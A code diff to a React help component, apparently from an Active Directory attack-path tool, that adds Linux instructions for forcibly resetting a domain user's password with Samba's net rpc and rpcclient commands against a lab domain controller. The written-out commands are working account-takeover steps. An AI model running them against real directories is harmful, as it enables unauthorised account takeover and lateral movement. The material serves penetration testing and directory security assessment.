@@ -65,6 +65,26 @@ const Abuse = ({ sourceName, sourceType }) => {
                 or perhaps even RDP to a system the target user has access to.
                 For more ideas and information, see the references tab.
             </p>
+            <p>
+                        You can also abuse this without using Windows-based
+                        tooling if you are operating from a Linux host.
+                        The net and rpcclient utilities from the Samba
+                        toolset will let you forcefully change a users password.
+                        The following command will leverage net to reset the password.
+            </p>
+            <pre>
+                <code>{"net rpc password 'harmj0y' -U 'TESTLAB\\dfm.a' -S dc.testlab.local\n"}
+                </code>
+            </pre>
+            <p>
+                        The following commands will leverage rpcclient to reset
+                        the password.
+            </p>
+            <pre>
+                <code>{"rpcclient -U 'TESTLAB\\dfm.a' dc.testlab.local\n"+
+                "rpcclient $> setuserinfo2 harmj0y 23 Password123!"}
+                </code>
+            </pre>
         </>
     );
 };
